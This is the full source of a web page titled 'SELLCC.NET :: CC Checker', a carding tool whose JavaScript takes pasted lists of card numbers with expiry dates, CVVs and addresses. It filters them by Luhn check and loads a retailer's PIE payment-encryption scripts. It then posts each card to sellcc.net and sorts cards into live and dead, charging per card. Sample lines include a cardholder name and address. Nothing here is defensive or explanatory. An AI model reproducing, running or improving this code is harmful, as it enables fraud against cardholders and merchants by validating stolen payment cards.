<script type="text/javascript" src="https://pie-production.walgreens.com/pie/v1/Walgreens/getkey.js"></script>
<script type="text/javascript" src="https://pie-production.walgreens.com/pie/v1/encryption.js"></script>
<script type="text/javascript" src="../store/ajaxx.js"></script>

    <script type="text/javascript" charset="utf-8">
	  Array.prototype.remove = function(value) {
      var index = this.indexOf(value);
      if (index != -1) {
          this.splice(index, 1);
      }
      return this;
  };
	  function is_numeric(n) {
  return !isNaN(parseFloat(n)) && isFinite(n);
}
function substr_count(string,substring,start,length)
{
 var c = 0;
 if(start) { string = string.substr(start); }
 if(length) { string = string.substr(0,length); }
 for (var i=0;i<string.length;i++)
 {
  if(substring == string.substr(i,substring.length))
  c++;
 }
 return c;
}
	function info(ccline)
{

	      var  xy = ["|", "\\", "/", "-", ";", ":"];
      var  sepe = xy[0];

		xy.forEach(function(element){

            if (substr_count(ccline, sepe) < substr_count(ccline, element)) {
                sepe = element;
            }
});
			
        if (sepe == "|") {

			ccline=ccline.split('/').join("|");
			ccline=ccline.split('=>').join("|");
        } else {
            if (sepe == "/") {
			ccline=ccline.split('/').join("/");
			ccline=ccline.split('=>').join("/");

            }
        }
		var x = ccline
x=x.replace(/\s\s+/g, '');

		x = ccline.split(sepe);
							
						
				//xac dinh cc
									var ccnum = {num:null, type:null, mon:null,year:null,zipcode:null,cvv:null};
var ccv = {cv4:null,cv3:null};
								x.forEach(function(xx){
					xx = xx.trim();
					//alert(xx);

					if (is_numeric(xx)) {
yy = xx.length;


                switch ( yy) {
                    case 15:
                        if (xx.substr(0, 1) == 3) {
                            ccnum['num'] = xx;
                            ccnum['type'] = "AM";
                        }
                        break;
                    case 16:
                        switch (xx.substr(0, 1)) {
                            case '4':
                                ccnum['num'] = xx;
                                ccnum['type'] = "VI";
                                break;
                            case '5':
                                ccnum['num'] = xx;
                                ccnum['type'] = "MC";
                                break;
                            case '6':
                                ccnum['num'] = xx;
                                ccnum['type'] = "DI";
                                break;
                        }
							
                        break;
                    case 1:
                        if ((parseInt(xx) >= 1) && (parseInt(xx) <= 12) && (ccnum['mon']==null)) {
                            ccnum['mon'] = "0" + xx;
                        }
						
                    case 2:
                        if ((parseInt(xx) >= 1) && (parseInt(xx) <= 12) && (ccnum['mon']==null)) {
                            ccnum['mon'] = xx;

                        } else if ((parseInt(xx) >= 14) && (parseInt(xx) <= 29) && (ccnum['mon']!=null) && (ccnum['year']==null)) {
                            ccnum['year'] = "20"  + xx;
                        }
						
						
                        break;
                    case 4:
                        if ((parseInt(xx) >= 2014) && (parseInt(xx) <= 2029)) {
                            ccnum['year'] = xx;
                        } else if ((parseInt(xx.substr( 0, 2)) >= 1) && (parseInt(xx.substr( 0, 2)) <= 12) && (parseInt(xx.substr(2,2)) >= 14) && (parseInt(xx.substr(2,2
)) <= 29) && (ccnum['mon']==null) && (ccnum['year']==null)
                        ) {
                            ccnum['mon'] = xx.substr( 0, 2);
                            ccnum['year'] = "20" + xx.substr( 2, 2);
                        } else {
                            ccv['cv4'] = xx;
                        }
                        break;
                    case 6:
                        if ((parseInt(xx.substr(0, 2)) >= 1) && (parseInt(xx.substr(0, 2)) <= 12) && (parseInt(xx.substr(2,4)) >= 2014) && (parseInt(xx.substr(2, 4) )<= 2029)
                        ) {
                            ccnum['mon'] = xx.substr(0, 2);
                            ccnum['year'] = xx.substr(2, 4);
                        }
                        break;
                    case 3:
                        ccv['cv3'] = xx;
                        break;
                    case 5:
                        ccnum['zipcode'] = xx;
                        break;

                }
				
					//end if
					}
				});

				        if (ccnum['num'] !=null && ccnum['mon']!=null && ccnum['year']!=null) {
            if (ccnum['type'] == "AM") {
                ccnum['cvv'] = ccv['cv4'];
            } else {
                ccnum['cvv'] = ccv['cv3'];
            }

            return ccnum;
        } else {
            return false;
        }
		//end function
}
	            function remove_line(line) {
                if (line.length > 0) {
                    var textarea = document.getElementById('textarea_remain');
                    //var string = teatarea.value;
                    // var new_string = string.replace(/\r?\n.?*$/, '');
                    //textarea.value = new_string;

                    var total = textarea.value.split("\n");


                    for (var i = 0; i < total.length; i++) {
                        if (total[i].indexOf(line)) {
                            //alert(total[i]);
                            total.splice(i, 1);
                            break;       //<-- Uncomment  if only the first term has to be removed
                        }
                    }

                    textarea.value = total.join("\n");

                }
            }
function setLength(res) {
if (res.length < 10) {
return "00" + res.length;
} else if (res.length >= 10 && res.length < 100) {
return "0" + res.length;
} else {
return res.length;
}
}
function getEncryptionValue(value) {

var card = ProtectPANandCVV(value, '', true);

var BA_byte1_dataType;
var BA_byte2_encryptType;
var tag_BA;

var BB_byte1_prfxMetaDataInd;
var tag_BB;

var BC_subtagC2_pieType;
var BC_subtagC3_KeyId;
var BC_subtagC4_phaseBit;
var BC_subtagC5_intgCheckVal;
var BC_subtagC6_implVersNum;
var tag_BC;
var tag_BC_substring;
var subfid9B;
var fidQ;
BA_byte1_dataType = "2"; // 2: Encrypted
BA_byte2_encryptType = "1"; // 1: Pie Encryption 

BB_byte1_prfxMetaDataInd = "1"; // 0 : Do not sent prefix metadata

tag_BA = "BA002" + BA_byte1_dataType + BA_byte2_encryptType;
tag_BB = "BB001" + BB_byte1_prfxMetaDataInd;

BC_subtagC2_pieType = "C2001" + "3";
BC_subtagC3_KeyId = "C3"+setLength(PIE.key_id) + PIE.key_id;

BC_subtagC4_phaseBit = "C4001" + PIE.phase;
BC_subtagC5_intgCheckVal = "C5"+setLength(card[2]) + card[2];

BC_subtagC6_implVersNum = "C6001" + "1";

tag_BC_substring = BC_subtagC2_pieType +
BC_subtagC3_KeyId +
BC_subtagC4_phaseBit +
BC_subtagC5_intgCheckVal +
BC_subtagC6_implVersNum;

tag_BC = 'BC'+setLength(tag_BC_substring) + tag_BC_substring;

subfid9B = tag_BA + tag_BB + tag_BC;
var results = {};
results[0] = subfid9B;
results[1] = card[0];

return results;
}

		
function filterCC2(cc) {
        var ccs = cc.split('\n');
        var filtered = [];
        var lstcc = [];
        for (var i = 0; i < ccs.length; i++) {
            if (ccs[i].length > 0) {
                var variable2c = /(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})/g;
                var variable2d = ccs[i].match(variable2c);
                if (variable2d === null || !LuhnCheck(variable2d[0])) {
                    continue;
                }
                if (filtered.indexOf(variable2d[0]) == -1) {
                    filtered.push(variable2d[0]);
                    lstcc.push(ccs[i]);
                }
            }
        }
        return lstcc;
  }

    var LuhnCheck = (function() {
        var variable2f = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
        return function(variable26) {
            var variable30 = 0;
            var variable31;
            var variable32 = false;
            var variable33 = String(variable26).replace(/[^\d]/g, "");
            if (variable33.length === 0) {
                return false;
            }
            for (var i = variable33.length - 1; i >= 0; --i) {
                variable31 = parseInt(variable33.charAt(i), 10);
                variable30 += (variable32 = !variable32) ? variable31 : variable2f[variable31];
            }
            return (variable30 % 10 === 0);
        };
  })
    </script>
    
    <script type="text/javascript">
    $(document).ready(function(){
        $('#pause').click(function(event) {
            if (typeof ajaxCall == "object") ajaxCall.abort();
			$('#area_remain').css("display","block");
            $('#pause').css("display","none");
			$('#newcheck').css("display","inline");
             
        });
        
        $('#start').click(function(event) {

            var listcc = $('#listcc').val();                  

            var arr_cc = filterCC2(listcc);
            if (validation_form_check()==false)
                return;
$('#progress_title').html("Checking...."); 
            $('#listcc').val(arr_cc.join("\n"));
            $('#start').css("display","none");
            $('#pause').css("display","inline");
						$('#newcheck').css("display","inline");
						$("#listcc").css("display","none");
						$(".progress").css("display","block");

            var tong_cc_in_box = arr_cc.length;
            var tong_cc_checked = parseInt($('#cc_checked').html());

            var tong_cc = tong_cc_checked + tong_cc_in_box;

            $('#tong_cc').html(tong_cc);
			$('.total_number_static').html(tong_cc);
					                        $('#numberok_remain').html(tong_cc_in_box);
					            $('#textarea_remain').val($('#listcc').val());
            Process_cc (arr_cc, cur_cc = 0);
        });
    });
	  function update_box_cc(cc) {
      var arr_cc = $("#listcc").val().split("\n");
      arr_cc.remove(cc);
      $('#listcc').val(arr_cc.join("\n"));
  }
	  function validation_form_check() {
		            var x = $("#listcc").val()
    if (x == null || x == "") {

          alert("The CC field is required!");
		  $(window).scrollTop(0);
		  return false;
	  }
  }
  
</script>
<script type="text/javascript">
    function Process_cc (arr_cc, cur_cc) {
        if (cur_cc >= arr_cc.length) {
$('#progress_title').html("Complete"); 

            $('#start').css("display","none");
            $('#pause').css("display","none");
			$('#newcheck').css("display","inline");
      
            return;
        }
         //xu ly encrypt cc
		 var ccnum=info(arr_cc[cur_cc]);
		 
		 		 		 if(!ccnum)
		 {
			                         $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|'+'<b style="color:black">Line error</b>' + '|' + arr_cc[cur_cc] + '<br>');
                        $('#numberok_LineErorr').html(parseInt($('#numberok_LineErorr').html()) + 1);
									$('#textarea_LineErorr').val($('#textarea_LineErorr').val() + arr_cc[cur_cc].trim() + "\n"); 
									$('#area_LineErorr').css("display","block");
									                    // Update số cc da check
                    $('#cc_checked').html(parseInt($('#cc_checked').html()) + 1);

                    // Calculate percent
                    var temp = (parseInt($('#cc_checked').html()) * 100) / parseInt($('#tong_cc').html());
                    var percent = temp.toFixed(0) + '%'; 
                                    // Calculate percent
                    var temp_static_remain = (parseInt($('#numberok_remain').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_remain_percent = temp_static_remain.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_live = (parseInt($('#numberok_live').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_live_percent = temp_static_live.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_liveccn = (parseInt($('#numberok_liveccn').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_liveccn_percent = temp_static_liveccn.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_die = (parseInt($('#numberok_die').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_die_percent = temp_static_die.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_CCInvaid = (parseInt($('#numberok_CCInvaid').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_CCInvaid_percent = temp_static_CCInvaid.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_CanCheck = (parseInt($('#numberok_CanCheck').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_CanCheck_percent = temp_static_CanCheck.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_UnKnow = (parseInt($('#numberok_UnKnow').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_UnKnow_percent = temp_static_UnKnow.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_LineErorr = (parseInt($('#numberok_LineErorr').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_LineErorr_percent = temp_static_LineErorr.toFixed(0) + '%';
                    


                    // Update process bar
                    $('#progress_bar').css('width', percent);
                    $('.percent').html(percent);
                    $('#progress_bar').css('width', numberok_remain_percent);
                    $('.numberok_remain_percent').html(numberok_remain_percent);
                    $('#progress_bar').css('width', numberok_live_percent);
                    $('.numberok_live_percent').html(numberok_live_percent);
                    $('#progress_bar').css('width', numberok_liveccn_percent);
                    $('.numberok_liveccn_percent').html(numberok_liveccn_percent);
                    $('#progress_bar').css('width', numberok_die_percent);
                    $('.numberok_die_percent').html(numberok_die_percent);
                    $('#progress_bar').css('width', numberok_CCInvaid_percent);
                    $('.numberok_CCInvaid_percent').html(numberok_CCInvaid_percent);
                    $('#progress_bar').css('width', numberok_CanCheck_percent);
                    $('.numberok_CanCheck_percent').html(numberok_CanCheck_percent);
                    $('#progress_bar').css('width', numberok_UnKnow_percent);
                    $('.numberok_UnKnow_percent').html(numberok_UnKnow_percent);
                    $('#progress_bar').css('width', numberok_LineErorr_percent);
                    $('.numberok_LineErorr_percent').html(numberok_LineErorr_percent); 

                    // Update title
                    document.title = 'Checked :' + percent;            

                    // Update box cc
                    update_box_cc (arr_cc[cur_cc]);
					                        $('#numberok_remain').html(parseInt($('#numberok_remain').html()) - 1);
					            $('#textarea_remain').val($('#listcc').val());
                    // continue check other cc
                    Process_cc (arr_cc, cur_cc + 1);
                    return;
									
			 }
		 var result=getEncryptionValue(ccnum["num"]);
var cryptCard=result[0];
var cryptCvv=result[1];




		 //end xu ly encrytcc
        ajaxCall = jQuery.ajax({
            url: "https://sellcc.net/ccexp.php",
            type: 'POST',
            //dataType: 'json',
            //data: "lista="+arr_cc[cur_cc],
            data: "cclist="+arr_cc[cur_cc],
            complete: function(xhr, textStatus) {
//                $("#checkresult").hide();
//	$("#checkresult").html(msg).show("slow");
//	hideloading();
//	},
//	error: function(msg){
//	$("#checkresult").html("<font color='#ff0000'>Ajax loading error, please try again.</font>").show("slow");
//	hideloading();
//	}
                //called when complete
                //var credits='{{credit | raw}}'

            },
            
            
            success: function(responseText, textStatus, xhr) {
                var credits=balance()

                    if (responseText.match("CVV_Live")) 
                    {

                        $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|Credits:'+$('#balance').text()+'|'+'<b style="color:Green">Live Cvv' + '|' + arr_cc[cur_cc] + '</b><br><br>');
                        $('#numberok_live').html(parseInt($('#numberok_live').html()) + 1);
									$('#textarea_live').val($('#textarea_live').val() + "[sellcc.net]|Live|"+arr_cc[cur_cc].trim() + "\n"); 
									$('#area_live').css("display","block");

                    }
                    else if(responseText.match("CCN_Live"))
                    {

                        $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|Credits:'+$('#balance').text()+'|'+'<b style="color:Green">Live Ccn' + '|' + arr_cc[cur_cc] + '</b><br><br>');
                        $('#numberok_liveccn').html(parseInt($('#numberok_liveccn').html()) + 1);
									$('#textarea_liveccn').val($('#textarea_liveccn').val() + "[sellcc.net]|Live Ccn|" + arr_cc[cur_cc].trim() + "\n"); 
									$('#area_liveccn').css("display","block");
                    }
                    else if(responseText.match("Die"))
                    {

                        $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|Credits:'+$('#balance').text()+'|'+'<b style="color:Red">Die' + '|' + arr_cc[cur_cc] + '</b><br><br>');
                        $('#numberok_die').html(parseInt($('#numberok_die').html()) + 1);
									$('#textarea_die').val($('#textarea_die').val() + arr_cc[cur_cc].trim() + "\n"); 
									$('#area_die').css("display","block");
                    }
                    else if(responseText.match("Invaild"))
                    {
                        $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|Credits:'+$('#balance').text()+'|'+'<b style="color:black">CCInvaid</b>' + '|' + arr_cc[cur_cc] + '<br><br>');
                        $('#numberok_CCInvaid').html(parseInt($('#numberok_CCInvaid').html()) + 1);
									$('#textarea_CCInvaid').val($('#textarea_CCInvaid').val() + arr_cc[cur_cc].trim() + "\n");
									$('#area_CCInvaid').css("display","block"); 
                    }
                    else if(responseText.match("Cant Check"))
                    {
                        $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|Credits:'+$('#balance').text()+'|'+'<b style="color:black">Cant check</b>' + '|' + arr_cc[cur_cc] + '<br><br>');
                        $('#numberok_CanCheck').html(parseInt($('#numberok_CanCheck').html()) + 1);
									$('#textarea_CanCheck').val($('#textarea_CanCheck').val() + arr_cc[cur_cc].trim() + "\n"); 
									$('#area_CanCheck').css("display","block"); 
                    }                                                            
                    else if(responseText.match("Line_Error"))
                    {
                        $('#div_print_line').append(parseInt($('#cc_checked').html())+1+'/'+$('#tong_cc').html()+'|Credits:'+$('#balance').text()+'|'+'<b style="color:black">Line error</b>' + '|' + arr_cc[cur_cc] + '<br><br>');
                        $('#numberok_LineErorr').html(parseInt($('#numberok_LineErorr').html()) + 1);
									$('#textarea_LineErorr').val($('#textarea_LineErorr').val() + arr_cc[cur_cc].trim() + "\n"); 
									$('#area_LineErorr').css("display","block"); 
                    }                              
                    else if(responseText.match("Unknown"))
                    {
	                    Process_cc (arr_cc, cur_cc);
                    return;                 
                    }
                    else if(responseText.match("Please add balance"))
                    {
                        $('#div_print_line').append('<b style="color:black">Your credit is not enought</b>'+'<br>');
return;                    
                    }
			
                    // Update số cc da check
                    $('#cc_checked').html(parseInt($('#cc_checked').html()) + 1);

                    // Calculate percent
                    var temp = (parseInt($('#cc_checked').html()) * 100) / parseInt($('#tong_cc').html());
                    var percent = temp.toFixed(0) + '%'; 
                                    // Calculate percent
                    var temp_static_remain = (parseInt($('#numberok_remain').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_remain_percent = temp_static_remain.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_live = (parseInt($('#numberok_live').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_live_percent = temp_static_live.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_liveccn = (parseInt($('#numberok_liveccn').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_liveccn_percent = temp_static_liveccn.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_die = (parseInt($('#numberok_die').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_die_percent = temp_static_die.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_CCInvaid = (parseInt($('#numberok_CCInvaid').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_CCInvaid_percent = temp_static_CCInvaid.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_CanCheck = (parseInt($('#numberok_CanCheck').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_CanCheck_percent = temp_static_CanCheck.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_UnKnow = (parseInt($('#numberok_UnKnow').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_UnKnow_percent = temp_static_UnKnow.toFixed(0) + '%';
                                    // Calculate percent
                    var temp_static_LineErorr = (parseInt($('#numberok_LineErorr').html()) * 100) / parseInt($('.total_number_static').html());
                    var numberok_LineErorr_percent = temp_static_LineErorr.toFixed(0) + '%';
                    


                    // Update process bar
                    $('#progress_bar').css('width', percent);
                    $('.percent').html(percent);
                    $('#progress_bar').css('width', numberok_remain_percent);
                    $('.numberok_remain_percent').html(numberok_remain_percent);
                    $('#progress_bar').css('width', numberok_live_percent);
                    $('.numberok_live_percent').html(numberok_live_percent);
                    $('#progress_bar').css('width', numberok_liveccn_percent);
                    $('.numberok_liveccn_percent').html(numberok_liveccn_percent);
                    $('#progress_bar').css('width', numberok_die_percent);
                    $('.numberok_die_percent').html(numberok_die_percent);
                    $('#progress_bar').css('width', numberok_CCInvaid_percent);
                    $('.numberok_CCInvaid_percent').html(numberok_CCInvaid_percent);
                    $('#progress_bar').css('width', numberok_CanCheck_percent);
                    $('.numberok_CanCheck_percent').html(numberok_CanCheck_percent);
                    $('#progress_bar').css('width', numberok_UnKnow_percent);
                    $('.numberok_UnKnow_percent').html(numberok_UnKnow_percent);
                    $('#progress_bar').css('width', numberok_LineErorr_percent);
                    $('.numberok_LineErorr_percent').html(numberok_LineErorr_percent); 

                    // Update title
                    document.title = 'Checked :' + percent;            

                    // Update box cc
                    update_box_cc (arr_cc[cur_cc]);
					                        $('#numberok_remain').html(parseInt($('#numberok_remain').html()) - 1);
					            $('#textarea_remain').val($('#listcc').val());
                    // continue check other cc
                    Process_cc (arr_cc, cur_cc + 1);
                    return; 
                

            },
            
            error: function(xhr, textStatus, errorThrown) {
				if(textStatus!='abort'){
	                    Process_cc (arr_cc, cur_cc);
                    return;
}console(responseText)
            }
        });
    }

</script>
        <style type="text/css">
<!--
.style1 {color: #999999}
-->
    </style>
    <noscript>
            <meta http-equiv="refresh" content="0;URL=javascript.html"/>
    </noscript>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
        
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <title>SELLCC.NET :: CC Checker</title>
		<style>
.panel-heading {
    background-color: #f5f4f9;
    background-image: linear-gradient(to bottom, #f5f4f9 0%, #eceaf3 100%);
    background-repeat: repeat-x;
    border-bottom: 1px solid #cdcdcd;
    border-radius: 6px 6px 0 0;
    box-shadow: 0 1px 0 #ffffff inset;
    height: 36px;
    padding-left: 40px;
    position: relative;
	text-align:center;

}
.form-control {
    background-color: #2f323b;
    background-image: none;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.075) inset;
    color: #555;
    display: block;
    font-size: 14px;
    height: 34px;
    line-height: 1.42857;
    padding: 6px 12px;
    transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s;
    width: 100%;
}
input[type=button],input[type=submit] {
    background-color: #4CAF50;
    border: none;
    color: white;
    padding: 5px 15px;
    text-decoration: none;
    margin: 4px 2px;
    cursor: pointer;
}
.alert-success {
    background-color: #dff0d8!important;
    border-color: #d6e9c6!important;
    color: #3c763d!important;
}

.alert {
    border: 1px solid transparent!important;
    border-radius: 4px!important;
    margin-bottom: 20px!important;
    padding: 15px!important;
}
.well {
    background-color: #2f323b;
    border: 1px solid #fff;
    border-radius: 4px;
    box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05) inset;
    margin-bottom: 20px;
    min-height: 20px;
    padding: 19px;
}
.progress-bar {
  background-color: whiteSmoke;
  border-radius: 2px;
  box-shadow: 0 2px 3px rgba(0, 0, 0, 0.25) inset;

  width: 250px;
  height: 20px;
  
  position: relative;
  display: block;
}

.progress-bar > span {
  background-color: blue;
  border-radius: 2px;
  overflow: hidden;
  height: 20px;
  margin-bottom: 20px;
  border-radius: 4px;

  display: block;
  text-indent: -9999px;
}
.css3::-webkit-progress-value,
.php::-webkit-progress-value 
{
	/* Gradient background with Stripes */
	background-image:
	-webkit-linear-gradient( 135deg,
													 transparent,
													 transparent 33%,
													 rgba(0,0,0,.1) 33%,
													 rgba(0,0,0,.1) 66%,
													 transparent 66%),
    -webkit-linear-gradient( top,
														rgba(255, 255, 255, .25),
														rgba(0,0,0,.2)),
     -webkit-linear-gradient( left, #09c, #ff0);
}
.html5::-moz-progress-bar,
.php::-moz-progress-bar {
	/* Gradient background with Stripes */
	background-image:
	-moz-linear-gradient( 135deg,
													 transparent,
													 transparent 33%,
													 rgba(0,0,0,.1) 33%,
													 rgba(0,0,0,.1) 66%,
													 transparent 66%),
    -moz-linear-gradient( top,
														rgba(255, 255, 255, .25),
														rgba(0,0,0,.2)),
     -moz-linear-gradient( left, #09c, #f44);
}

.css3::-moz-progress-bar,
.php::-moz-progress-bar {
{
	/* Gradient background with Stripes */
	background-image:
	-moz-linear-gradient( 135deg,
													 transparent,
													 transparent 33%,
													 rgba(0,0,0,.1) 33%,
													 rgba(0,0,0,.1) 66%,
													 transparent 66%),
    -moz-linear-gradient( top,
														rgba(255, 255, 255, .25),
														rgba(0,0,0,.2)),
     -moz-linear-gradient( left, #09c, #ff0);
}

</style>
</head>

    <body style="background: #2f323b url(bg_1.png) repeat-x;min-width: 800px;">

    <table class="content" style="padding-top: 10px" border="0" cellspacing="0" cellpadding="0" width="100%">
    <tr>
    <td>
    <table class="well" style=" border-collapse:separate; border:  solid  1px #2f323b; padding: 10px 10px 10px 10px" width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
            <td>
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>

                    </tr>

                    <tr>
                        
                        <!--<td class="alert-success"><strong>Note: </strong>CCV VIP Support all types, all country of card.  Charge 10$. Open multiple TAB to check faster.</td> -->
                        <div class="col-sm-8">
                        <h4>Example:</h4>
                        <div class="well alert-success">
                        <!--<td class="alert-success"><strong>Example: </strong> -->
                        <span>5457497921800000|03|25|416</span><br>
                        <span>5457497921800000|0325|416</span><br>
                        <span>5457497921800000/0325/416</span><br>
                        <span>5457497921800000;0325;416;Maria De La Torre;Canada;ON;Brampton;L6Z0C7;5 Copperfield</span><br>
                        <span>5457497921800000|0325|416|Maria De La Torre|Canada|ON|Brampton|L6Z0C7|5 Copperfield</span>
                        </td>
                        </div>
                        </div>
                        <div class="col-sm-4">
                        <h4>Price:</h4>
                        <div class="well">
                        <center><h4>Checker price: {{CheckerPrice}} $ /piece</h4></center>
                        <p><center><h4>1 card = 1 line</h4></center></p>
                        <p><center><h4>Price: {{credit}} $</h4></center></p>

                        </div>
                       <!-- <td class="well">Live card = 4 credits, Die = 4 credits, Recheck if unknown</td>-->
                    </tr>
                </table>
            </td>
        </tr>
    </table>
   <!-- <div class="panel-heading">Credit Card Checker</div>-->
    <div class="panel-heading">Credit Card Checker 1 line = 1 card</div>
    <table id="striped" width="100%" border="0" bgcolor="#ffffff" cellspacing="1" cellpadding="2">

    <thead>
    <tr>
    <td width="100%" height="100%" align="left" bgcolor="#2f323b" style='padding: 2px; color:#333; border-bottom:1px solid #cccccc'>
    <!-- khu nay de code check -->
                <div class="progress php">
            <span id="progress-bar" class="green" style="width: 0%;"><span id="progress_title"></span></span>
   </div>
   
<div class="progress-bar">
<div class="progress">
   <strong><span id="titlecheck"><font color=green>Checked:</span> <span id="cc_checked">0</span> / <span id="tong_cc">0</span>&nbsp;~&nbsp;(<span class="percent">0%</span>)</font></strong>
   </div>
   </div>
<br>
                <div id="div_print_line" style="text-align: left;padding: 5px;margin-bottom: 10px;color: #f3cf0dfa;"></div>


                    <div id="area_remain" style="display:none;">
            <center><font color=blue><strong>Line Remain
                        <span id="numberok_remain">0</span>/<span class="total_number_static">0</span>&nbsp;~&nbsp;(<span class="numberok_remain_percent">0%</span>)</strong></font>
                    <textarea id="textarea_remain" wrap="off" name=cclist_remain style="width:100%;height:250px;font-size:13px;";></textarea></center><br></div>
                     <center>
                                <input name="ButtonStopChecking" style="display: none;" type="button" id="pause" value="Pause Check"/>
                                <input name="newcheck" type="button"  class="btn btn-info" style="display: none;" id="newcheck" value="New Check" onClick="window.top.location.reload();"/>
            
        </center>
                <div id="area_live" style="display:none;">
<br><br>
            <center><font color=green><strong>LIVE CVV
                        <span id="numberok_live">0</span>/<span class="total_number_static">0</span>&nbsp;~&nbsp;(<span class="numberok_live_percent">0%</span>)</strong></font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_live"></textarea>
            </center>
        </div>
                <div id="area_liveccn" style="display:none;">
<br><br>
            <center><font color=green><strong>LIVE CCN
                        <span id="numberok_liveccn">0</span>/<span class="total_number_static">0</span>&nbsp;~&nbsp;(<span class="numberok_liveccn_percent">0%</span>)</strong></font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_liveccn"></textarea>
            </center>
        </div>
        <div id="area_die" style="display:none;">
            <center><font color=red><strong>DIE
                        <span id="numberok_die">0</span>/<span class="total_number_static"></span>&nbsp;~&nbsp;(<span class="numberok_die_percent">0%</strong>)</font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_die"></textarea>
            </center>
        </div>

        <div id="area_CCInvaid" style="display:none;">
            <center><font color=red><strong>CCInvaid
                        <span id="numberok_CCInvaid">0</span>/<span class="total_number_static">0</span>&nbsp;~&nbsp;(<span class="numberok_CCInvaid_percent">0%</span>)</strong> </font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_CCInvaid"></textarea>
            </center>
        </div>

        <div id="area_CanCheck" style="display:none;">
            <center><font color=red><strong>Can't Check
                        <span id="numberok_CanCheck">0</span>/<span class="tong_cc">0</span>&nbsp;~&nbsp;(<span class="numberok_CanCheck_percent">0%</span>)</strong></font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_CanCheck"></textarea>
            </center>
        </div>

        <div id="area_UnKnow" style="display:none;">
            <center><font color=red><strong>Un Known
                        <span id="numberok_UnKnow">0</span>/<span class="total_number_static">0</span>&nbsp;~&nbsp;(<span class="numberok_UnKnow_percent">0%</span>)</strong> </font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_UnKnow"></textarea>
            </center>
        </div>

        <div id="area_LineErorr" style="display:none;">
            <center><font color=red><strong>LINE ERROR
                        <span id="numberok_LineErorr">0</span>/<span class="total_number_static">0</span>&nbsp;~&nbsp;(<span class="numberok_LineErorr_percent">0%</span>)</strong> </font>
            </center>
            <br>
            <center>
                <textarea readonly wrap="off" rows="10" style="width:90%;font-size:13px" id="textarea_LineErorr"></textarea>
            </center>
        </div>
        <center>
                        <textarea wrap="off" id="listcc" name=cclist style="width:100%;height:250px"></textarea><br>
                    <input type="button" id="start" name="start" value="Check Now!">
        </center>

</body>

<!--</html>
<div id="checkresult">

<hr>    
<div class='panel panel-default'>
<center><div class='panel-heading'>Credit Card Checker</div></center>
<form action=""> <textarea class="form-control" id="listcc" cols="120" rows="10"></textarea>
</div><center>
<label class="checkbox-inline">Duplicate Remove <input id=dup type=checkbox value=1 class="grey" checked> </label>
<label class="checkbox-inline">Sort by type <input id=type type=checkbox value=1 class="grey" checked> </label>
<label class="checkbox-inline">Sort Date <input id=date type=checkbox value=1 class="grey" > </label>
<label class="checkbox-inline">Check BIN info <input id=bin_info type=checkbox value=1 class="grey" checked> </label>
</center>-->
<!--<p>  <button onclick="checkcc();" class="btn btn-green btn-lg btn-block">Check Now  </button>-->
<!--
<input type="button" id="start" name="start" value="Check Now!"></p>
</form></div>
<div id="checkresult">
</div>-->
 


 